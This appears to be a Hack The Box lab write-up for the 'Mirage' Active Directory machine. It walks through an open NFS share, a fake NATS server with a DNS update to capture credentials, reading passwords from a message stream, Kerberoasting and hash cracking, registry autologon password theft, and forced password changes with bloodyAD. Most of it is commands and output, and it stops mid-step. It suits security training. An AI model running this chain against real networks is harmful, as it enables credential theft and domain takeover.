# Nmap
```
# Nmap 7.95 scan initiated Sun Jul 20 14:13:05 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.78
Nmap scan report for 10.10.11.78
Host is up (0.43s latency).
Not shown: 985 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-20 11:19:33Z)
111/tcp   open  rpcbind?
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE
| Not valid before: 2025-07-04T19:58:41
|_Not valid after:  2105-07-04T19:58:41
|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
50300/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-20T11:20:47
|_  start_date: N/A
|_clock-skew: -2h59m07s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 20 14:21:32 2025 -- 1 IP address (1 host up) scanned in 506.85 seconds
```


Add `dc01.mirage.htb` and `mirage.htb` to our`/etc/hosts`

# NFS service
Firstly, we don't have any default credentials, but we see that the NFS service is enabled.
```
2049/tcp  open  mountd        1-3 (RPC #100005)

┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ showmount -e 10.10.11.78
Export list for 10.10.11.78:
/MirageReports (everyone)
```

So let's mount it to our local machine and check what things in that
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ mkdir /tmp/mirage  

┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ sudo mount -t nfs 10.10.11.78:/MirageReports /tmp/mirage
```
Then we can check it and we found there are 2 pdf files
```
┌──(root㉿localhost)-[/tmp/mirage]
└─# ls
Incident_Report_Missing_DNS_Record_nats-svc.pdf
Mirage_Authentication_Hardening_Report.pdf
```

**Incident_Report_Missing_DNS_Record_nats-svc.pdf**
![](images/Pasted%20image%2020250720143332.png)

**Mirage_Authentication_Hardening_Report.pdf**
![](images/Pasted%20image%2020250720143843.png)

To summarize more concisely:
1. Abandon `NTLM` authentication and switch to a `Kerberos-only` authentication mode
2. Create a `dns` entry for `nats-svc.mirage.htb` and use a `responder` to obtain authentication

So let's modify our `/etc/krb5.conf` file firstly
```
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = MIRAGE.HTB

[realms]
    MIRAGE.HTB = {
        kdc = dc01.MIRAGE.HTB
        admin_server = dc01.MIRAGE.HTB
        default_domain = MIRAGE.HTB
    }

[domain_realm]
    .MIRAGE.HTB = MIRAGE.HTB
    MIRAGE.HTB = MIRAGE.HTB
```

# NATs exploits
Then let's make a fake `nats-server` and use `nsupdate` to send the update message
**fake_server.py**
```
import socket

print("[+] Fake NATS Server listening on 0.0.0.0:4222")
s = socket.socket()
s.bind(("0.0.0.0", 4222))
s.listen(5)

while True:
    client, addr = s.accept()
    print(f"[+] Connection from {addr}")

    # Send fake INFO (obligatoire pour handshake NATS)
    client.sendall(b'INFO {"server_id":"FAKE","version":"2.11.0","auth_required":true}\r\n')

    data = client.recv(1024)
    print("[>] Received:")
    print(data.decode())

    # Optional: respond with -ERR or close connection
    client.close()
```

Then run the script and send the update message
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 3600 A 10.10.14.13
> send

┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ python3 script.py                              
[+] Fake NATS Server listening on 0.0.0.0:4222
[+] Connection from ('10.10.11.78', 64823)
[>] Received:
CONNECT {"verbose":false,"pedantic":false,"user":"Dev_Account_A","pass":"hx5h7F5554fP@1337!","tls_required":false,"name":"NATS CLI Version 0.2.2","lang":"go","version":"1.41.1","protocol":1,"echo":true,"headers":false,"no_responders":false}

```

We successfully get one of credit `Dev_Account_A:hx5h7F5554fP@1337!`

Then we can use `natscli` to interact with this credit
https://github.com/nats-io
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ /opt/nats-0.2.4-linux-arm64/nats context add dev-nats \
  --server nats://dc01.mirage.htb:4222 \
  --user Dev_Account_A \
  --password 'hx5h7F5554fP@1337!' \
  --description "Dev access"
NATS Configuration Context "dev-nats"

  Description: Dev access
  Server URLs: nats://dc01.mirage.htb:4222
     Username: Dev_Account_A
     Password: ******************
         Path: /home/wither/.config/nats/context/dev-nats.json

┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ /opt/nats-0.2.4-linux-arm64/nats --context dev-nats sub ">" --count 10 

15:09:34 Subscribing on > 
[#1] Received on "$JS.API.STREAM.INFO.auth_logs" with reply "_INBOX.hiC9z2e0Xl3baBFA1YaO99.qt7mNM4b"
nil body


[#2] Received on "_INBOX.hiC9z2e0Xl3baBFA1YaO99.qt7mNM4b"
{"type":"io.nats.jetstream.api.v1.stream_info_response","total":0,"offset":0,"limit":0,"config":{"name":"auth_logs","subjects":["logs.auth"],"retention":"limits","max_consumers":-1,"max_msgs":100,"max_bytes":1048576,"max_age":0,"max_msgs_per_subject":-1,"max_msg_size":-1,"discard":"new","storage":"file","num_replicas":1,"duplicate_window":120000000000,"compression":"none","allow_direct":true,"mirror_direct":false,"sealed":false,"deny_delete":true,"deny_purge":true,"allow_rollup_hdrs":false,"consumer_limits":{},"allow_msg_ttl":false,"metadata":{"_nats.level":"1","_nats.req.level":"0","_nats.ver":"2.11.3"}},"created":"2025-05-05T07:18:19.6244845Z","state":{"messages":5,"bytes":570,"first_seq":1,"first_ts":"2025-05-05T07:18:56.6788658Z","last_seq":5,"last_ts":"2025-05-05T07:19:27.2106658Z","num_subjects":1,"consumer_count":1},"cluster":{"leader":"NAH4LAMD6PTGJ622LMXC35RRBIW6L3YW2DLVYFWUVXRB6YWONH2GZIME"},"ts":"2025-07-20T12:16:01.5155287Z"}


[#3] Received on "$JS.EVENT.ADVISORY.API"
{"type":"io.nats.jetstream.advisory.v1.api_audit","id":"jCTLkyff7JDePSU8JUlfwv","timestamp":"2025-07-20T12:16:01.5155287Z","server":"NAH4LAMD6PTGJ622LMXC35RRBIW6L3YW2DLVYFWUVXRB6YWONH2GZIME","client":{"start":"2025-07-20T05:16:01.5144746-07:00","host":"dead:beef::d697:5c15:ad98:6a7b","id":743,"acc":"dev","user":"Dev_Account_A","name":"NATS CLI Version 0.2.2","lang":"go","ver":"1.41.1","rtt":524100,"server":"NAH4LAMD6PTGJ622LMXC35RRBIW6L3YW2DLVYFWUVXRB6YWONH2GZIME","kind":"Client","client_type":"nats"},"subject":"$JS.API.STREAM.INFO.auth_logs","response":"{\"type\":\"io.nats.jetstream.api.v1.stream_info_response\",\"total\":0,\"offset\":0,\"limit\":0,\"config\":{\"name\":\"auth_logs\",\"subjects\":[\"logs.auth\"],\"retention\":\"limits\",\"max_consumers\":-1,\"max_msgs\":100,\"max_bytes\":1048576,\"max_age\":0,\"max_msgs_per_subject\":-1,\"max_msg_size\":-1,\"discard\":\"new\",\"storage\":\"file\",\"num_replicas\":1,\"duplicate_window\":120000000000,\"compression\":\"none\",\"allow_direct\":true,\"mirror_direct\":false,\"sealed\":false,\"deny_delete\":true,\"deny_purge\":true,\"allow_rollup_hdrs\":false,\"consumer_limits\":{},\"allow_msg_ttl\":false,\"metadata\":{\"_nats.level\":\"1\",\"_nats.req.level\":\"0\",\"_nats.ver\":\"2.11.3\"}},\"created\":\"2025-05-05T07:18:19.6244845Z\",\"state\":{\"messages\":5,\"bytes\":570,\"first_seq\":1,\"first_ts\":\"2025-05-05T07:18:56.6788658Z\",\"last_seq\":5,\"last_ts\":\"2025-05-05T07:19:27.2106658Z\",\"num_subjects\":1,\"consumer_count\":1},\"cluster\":{\"leader\":\"NAH4LAMD6PTGJ622LMXC35RRBIW6L3YW2DLVYFWUVXRB6YWONH2GZIME\"},\"ts\":\"2025-07-20T12:16:01.5155287Z\"}"}
```

We successfully get connect to `NATs` service here.
Now we should focus on the `auth_logs` stream and get historical messages through the `JetStream` consumer next command.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ /opt/nats-0.2.4-linux-arm64/nats --context dev-nats consumer add auth_logs audit-reader --pull --ack=explicit

[dev-nats] ? Start policy (all, new, last, subject, 1h, msg sequence) all
[dev-nats] ? Replay policy instant
[dev-nats] ? Filter Stream by subjects (blank for all) logs.auth
[dev-nats] ? Maximum Allowed Deliveries 1
[dev-nats] ? Maximum Acknowledgments Pending 5
[dev-nats] ? Deliver headers only without bodies No
[dev-nats] ? Add a Retry Backoff Policy No
Information for Consumer auth_logs > audit-reader created 2025-07-20 12:26:56

Configuration:

                    Name: audit-reader
               Pull Mode: true
          Filter Subject: logs.auth
          Deliver Policy: All
              Ack Policy: Explicit
                Ack Wait: 30.00s
           Replay Policy: Instant
      Maximum Deliveries: 1
         Max Ack Pending: 5
       Max Waiting Pulls: 512

State:

            Host Version: 2.11.3
      Required API Level: 0 hosted at level 1
  Last Delivered Message: Consumer sequence: 0 Stream sequence: 0
    Acknowledgment Floor: Consumer sequence: 0 Stream sequence: 0
        Outstanding Acks: 0 out of maximum 5
    Redelivered Messages: 0
    Unprocessed Messages: 5
           Waiting Pulls: 0 of maximum 512

```

Then let's pull the messages
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ /opt/nats-0.2.4-linux-arm64/nats --context dev-nats consumer next auth_logs audit-reader --count=5 --wait=5s --ack

[15:20:12] subj: logs.auth / tries: 1 / cons seq: 1 / str seq: 1 / pending: 4

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message after 629.702564ms delay

[15:20:13] subj: logs.auth / tries: 1 / cons seq: 2 / str seq: 2 / pending: 3

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message after 358.081989ms delay

[15:20:14] subj: logs.auth / tries: 1 / cons seq: 3 / str seq: 3 / pending: 2

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message after 2.428837443s delay

[15:20:18] subj: logs.auth / tries: 1 / cons seq: 4 / str seq: 4 / pending: 1

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message after 549.003677ms delay

[15:20:19] subj: logs.auth / tries: 1 / cons seq: 5 / str seq: 5 / pending: 0

{"user":"david.jjackson","password":"pN8kQmn6b86!1234@","ip":"10.10.10.20"}

Acknowledged message after 3.238919648s delay

```

We successfully get another credit `david.jjackson:pN8kQmn6b86!1234@`

# Bloodhound by david.jjackson
Then let's check the credit 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ sudo ntpdate dc01.mirage.htb                                    
2025-07-20 12:30:51.216502 (+0000) -10324.444328 +/- 0.233875 dc01.mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by -10324.444328
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ nxc ldap 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k
LDAP        10.10.11.78     389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        10.10.11.78     389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@
```

And also, we can enumerate the user lists
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ nxc ldap 10.10.11.78 -u david.jjackson -p 'pN8kQmn6b86!1234@' -k --users
LDAP        10.10.11.78     389    DC01             [*] None (name:DC01) (domain:mirage.htb)
LDAP        10.10.11.78     389    DC01             [+] mirage.htb\david.jjackson:pN8kQmn6b86!1234@ 
LDAP        10.10.11.78     389    DC01             [*] Enumerated 10 domain users: mirage.htb
LDAP        10.10.11.78     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.11.78     389    DC01             Administrator                 2025-06-23 21:18:18 0        Built-in account for administering the computer/domain      
LDAP        10.10.11.78     389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.11.78     389    DC01             krbtgt                        2025-05-01 07:42:23 0        Key Distribution Center Service Account                     
LDAP        10.10.11.78     389    DC01             Dev_Account_A                 2025-05-27 14:05:12 0                                                                    
LDAP        10.10.11.78     389    DC01             Dev_Account_B                 2025-05-02 08:28:11 1                                                                    
LDAP        10.10.11.78     389    DC01             david.jjackson                2025-05-02 08:29:50 0                                                                    
LDAP        10.10.11.78     389    DC01             javier.mmarshall              2025-07-20 06:32:54 0        Contoso Contractors                                         
LDAP        10.10.11.78     389    DC01             mark.bbond                    2025-06-23 21:18:18 0                                                                    
LDAP        10.10.11.78     389    DC01             nathan.aadam                  2025-06-23 21:18:18 0                                                                    
LDAP        10.10.11.78     389    DC01             svc_mirage                    2025-05-22 20:37:45 0        Old service account migrated by contractors   
```

Also we can bloodhound this user
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ bloodhound-python  -u david.jjackson -p 'pN8kQmn6b86!1234@' -k -d mirage.htb -ns 10.10.11.78 -c ALl --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: mirage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 12 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.mirage.htb
INFO: Done in 01M 41S
INFO: Compressing output into 20250720123334_bloodhound.zip
```

Sibling Objects in the Same OU
![](images/Pasted%20image%2020250720123854.png)

We can try to use `impacket-GetUserSPNs` to get the `krbs` hash of `Nathan`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ impacket-GetUserSPNs 'mirage.htb/david.jjackson' -dc-host dc01.mirage.htb -k -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName      Name          MemberOf                                                             PasswordLastSet             LastLogon                   Delegation 
------------------------  ------------  -------------------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/exchange.mirage.htb  nathan.aadam  CN=Exchange_Admins,OU=Groups,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb  2025-06-23 21:18:18.584667  2025-07-20 06:49:05.069834             


$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$ff55629e4501a71bdc58d79922a17e7b$294d578fd6dbbf5ef7460cf79d59fae89a41394d4eb2cfafd109eb4f8265c188893dbd67013aeac6c81f6bbdc4bac89bd9a51a7fb3fa7e0844589e30947e754e47f178c25c34011f9ad0bebc7ca7f313abaf089eb6ac2ad21c08dcd7bbf182e58eda4b8d5e6246abd75da17d1f657c1e0febbf1ef6926039d943e079992c3a33b23c7750e0fa6cc15f3dd42515392efea5cb4e0ac3ef0de50f1c8d2a5f5649e58206abd2fda1b2ed8d572e775988eb03c5b389cc6733a59c47e0f3da4263fd62f2063b58949d74554e27bf83598328aa10cad8871fad67de0482a470be476aa218b29aa136cf4a6e69d1431eda13951da2cbced850b92e9246ad5f50c79c626cc224f0241069ed2f1867de070bc1be03c3d674f1cb135f25772f5a08f8d16fdeeed89411b4b92aa823dfce8bbcdb40277b04e36358867af8ab0dca01b528fcc0e8b7d4fd8494f6b8736f3be6cf675552e5ce86e89397cb0f82526e1f043fc26112ba75cd6fa1961be278f424069779146d2845f6c19f5be17818efe4f1dd0d21a26c8f5ab0db8feea7457b71ad1383b64c19fb27a758a3614ccfa064f0e1536390573df7e0daff8c91c29f9d057dd7afcbf95c2906de56400f73265b2d5ce007e92dddcdca2d01e7d5669799769a7c8343e88802c3fd030ae8e231a1b4cfa880d02140c7ecf374c9c4fae1f6f36208e67922a21ee920881b58c0d849d345be732a48a627876f1678485dc0781d5bc43214300fb8975a09e6d2a992e101f419f1c4564416a9ef66cc6216b5d5a7b0b7bf7e8a748d54e1ab23e003b58117e99d26358120275fb081a41eaf31053f6b11adbfc75cd57fe7cacf8f2d8989d9b2eb5ccc45905a3870633c8eaa83033d9b600d5ae12ee1e567940626de28bfe4bdaada5454fac321ac8be1b66c6aa9ed7c19efde0eb7c1a27ba9af5bcb19c1b3451c7bb5e0416c25b78969bb05af65866042807371d83b21f4f5e0dc6c2c07514093cf59fc5c657061867464c86b645eb8078b03189f20cf28c1485d98fb1766304d57ffca3c799146e93da0d42b5e50b14553ba6f72addf968b648a5dc661d8475630fccdedc57db5bb59ec96ecc1009bc80380ab7164d04bc02d145cf57da5eaf3af8ca52b63b31374352f3b81a977d7759d243ae777a970ca80592b1d123d1ca22e0b107f7353d6a9652bc6f06495e8efdfb4a5e35e0ba532c2373cc7c1f2d957ed7305c2d899c1b4c9893a523a83bfe89bfca709c30bdcaa1bd87763a218d5cc08ad24297c85e3b9cdf19135524050b28c4e56a1aec2457f483d4679d3c469c60803b2a315b1fc361e204432f4f338b21edffaeef9e269a77ce0f85e1ab9b3490db3e881e3f162202a5352d749dbd71dfd3c600afa5959da21089ae83c953cf33abf2e1d196c91ddc8816fba32432f78c7de45a95e2f704ccf0ff65bf0a5af112ed02c4f326ba37a8da6f13bdb5e0bc2f532ad3d9c15965070a7fd4fbeb27e91b23ed725a9cfa2140a004b1e83e19deef9776b5f4a4540fa15a5c1dd796b5a55365a51ef997ce9030a83810a2da70105b23fd1f1013454081faa

```

Then we can use `hashcat` to crack the password of `nathan`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ hashcat nathan.hash /usr/share/wordlists/rockyou.txt -m 13100 --show
$krb5tgs$23$*nathan.aadam$MIRAGE.HTB$mirage.htb/nathan.aadam*$ff55629e4501a71bdc58d79922a17e7b$294d578fd6dbbf5ef7460cf79d59fae89a41394d4eb2cfafd109eb4f8265c188893dbd67013aeac6c81f6bbdc4bac89bd9a51a7fb3fa7e0844589e30947e754e47f178c25c34011f9ad0bebc7ca7f313abaf089eb6ac2ad21c08dcd7bbf182e58eda4b8d5e6246abd75da17d1f657c1e0febbf1ef6926039d943e079992c3a33b23c7750e0fa6cc15f3dd42515392efea5cb4e0ac3ef0de50f1c8d2a5f5649e58206abd2fda1b2ed8d572e775988eb03c5b389cc6733a59c47e0f3da4263fd62f2063b58949d74554e27bf83598328aa10cad8871fad67de0482a470be476aa218b29aa136cf4a6e69d1431eda13951da2cbced850b92e9246ad5f50c79c626cc224f0241069ed2f1867de070bc1be03c3d674f1cb135f25772f5a08f8d16fdeeed89411b4b92aa823dfce8bbcdb40277b04e36358867af8ab0dca01b528fcc0e8b7d4fd8494f6b8736f3be6cf675552e5ce86e89397cb0f82526e1f043fc26112ba75cd6fa1961be278f424069779146d2845f6c19f5be17818efe4f1dd0d21a26c8f5ab0db8feea7457b71ad1383b64c19fb27a758a3614ccfa064f0e1536390573df7e0daff8c91c29f9d057dd7afcbf95c2906de56400f73265b2d5ce007e92dddcdca2d01e7d5669799769a7c8343e88802c3fd030ae8e231a1b4cfa880d02140c7ecf374c9c4fae1f6f36208e67922a21ee920881b58c0d849d345be732a48a627876f1678485dc0781d5bc43214300fb8975a09e6d2a992e101f419f1c4564416a9ef66cc6216b5d5a7b0b7bf7e8a748d54e1ab23e003b58117e99d26358120275fb081a41eaf31053f6b11adbfc75cd57fe7cacf8f2d8989d9b2eb5ccc45905a3870633c8eaa83033d9b600d5ae12ee1e567940626de28bfe4bdaada5454fac321ac8be1b66c6aa9ed7c19efde0eb7c1a27ba9af5bcb19c1b3451c7bb5e0416c25b78969bb05af65866042807371d83b21f4f5e0dc6c2c07514093cf59fc5c657061867464c86b645eb8078b03189f20cf28c1485d98fb1766304d57ffca3c799146e93da0d42b5e50b14553ba6f72addf968b648a5dc661d8475630fccdedc57db5bb59ec96ecc1009bc80380ab7164d04bc02d145cf57da5eaf3af8ca52b63b31374352f3b81a977d7759d243ae777a970ca80592b1d123d1ca22e0b107f7353d6a9652bc6f06495e8efdfb4a5e35e0ba532c2373cc7c1f2d957ed7305c2d899c1b4c9893a523a83bfe89bfca709c30bdcaa1bd87763a218d5cc08ad24297c85e3b9cdf19135524050b28c4e56a1aec2457f483d4679d3c469c60803b2a315b1fc361e204432f4f338b21edffaeef9e269a77ce0f85e1ab9b3490db3e881e3f162202a5352d749dbd71dfd3c600afa5959da21089ae83c953cf33abf2e1d196c91ddc8816fba32432f78c7de45a95e2f704ccf0ff65bf0a5af112ed02c4f326ba37a8da6f13bdb5e0bc2f532ad3d9c15965070a7fd4fbeb27e91b23ed725a9cfa2140a004b1e83e19deef9776b5f4a4540fa15a5c1dd796b5a55365a51ef997ce9030a83810a2da70105b23fd1f1013454081faa:3edc#EDC3
```

We get another credit `nathan.aadam:3edc#EDC3`

# Bloodhound by nathan.aadam
Then we can get the `TGT` ticket and use `evil-winrm` to get the shell as `nathan`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ impacket-getTGT mirage.htb/'nathan.aadam':'3edc#EDC3'                                        
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in nathan.aadam.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ export KRB5CCNAME=nathan.aadam.ccache 

┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ evil-winrm -i dc01.mirage.htb -r mirage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> 

```

Then let's bloodhound nathan to gather more information
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ bloodhound-python  -u 'nathan.aadam' -p '3edc#EDC3'  -k -d mirage.htb -ns 10.10.11.78 -c ALl --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: mirage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.mirage.htb
INFO: Found 12 users
INFO: Found 57 groups
INFO: Found 2 gpos
INFO: Found 21 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.mirage.htb
INFO: Done in 01M 31S
INFO: Compressing output into 20250720124922_bloodhound.zip
```
![](images/Pasted%20image%2020250720125235.png)
![](images/Pasted%20image%2020250720125307.png)
![](images/Pasted%20image%2020250720125519.png)
![](images/Pasted%20image%2020250720130430.png)

As per bloodhound data:
```
Nathan is group member of IT_ADMIN

MARK.BBOND (Member of IT_SUPPORT) --> ForceChangePassword --> JAVIER.MMARSHALL

JAVIER.MMARSHALL --> ReadGMSAPassword --> MIRAGE-SERVICE$
```

I think we can try to find the credit of `Mark.BBOND`
```
*Evil-WinRM* PS C:\Users\nathan.aadam\Desktop> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    MIRAGE
    DefaultUserName    REG_SZ    mark.bbond
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x6a7ceafc
    ShutdownFlags    REG_DWORD    0x8000022b
    DisableLockWorkstation    REG_DWORD    0x0
    AutoAdminLogon    REG_SZ    1
    AutoLogonSID    REG_SZ    S-1-5-21-2127163471-3824721834-2568365109-1109
    LastUsedUsername    REG_SZ    mark.bbond
    DefaultPassword    REG_SZ    1day@atime

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey

```
We can get the default credit of `Mark.bbond`
```
mark.bbond:1day@atime
```

# Forcechange password of Javier
Let's use `bloodyAD` to help us force change the password of `JAVIER.MMARSHALL`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ bloodyAD -k --host dc01.mirage.htb -d mirage.htb -u 'mark.bbond' -p '1day@atime' set password JAVIER.MMARSHALL 'Abc123456@' 
[+] Password changed successfully!


┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ bloodyAD -k --host dc01.mirage.htb -d 'mirage.htb' -u 'javier.mmarshall' -p 'Abc123456@' get object 'Mirage-Service$' --attr msDS-ManagedPassword

minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_CLIENT_REVOKED Detail: "Client’s credentials have been revoked"
```

Let's check if this user is enabled
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ bloodyAD --kerberos -u "mark.bbond" -p '1day@atime' -d "mirage.htb" --host "dc01.mirage.htb" get object "javier.mmarshall" --attr userAccountControl

distinguishedName: CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```
This means that the user account has been disabled and cannot be logged in

So we need to enable this account first and then get the `msDS-ManagedPassword`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ impacket-getTGT mirage.htb/'mark.bbond':'1day@atime'                                                                             
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in mark.bbond.ccache
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ export KRB5CCNAME=mark.bbond.ccache                                             
                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
└─$ bloodyAD --host dc01.mirage.htb --dc-ip 10.10.11.78 -d mirage.htb -k remove uac JAVIER.MMARSHALL -f ACCOUNTDISABLE
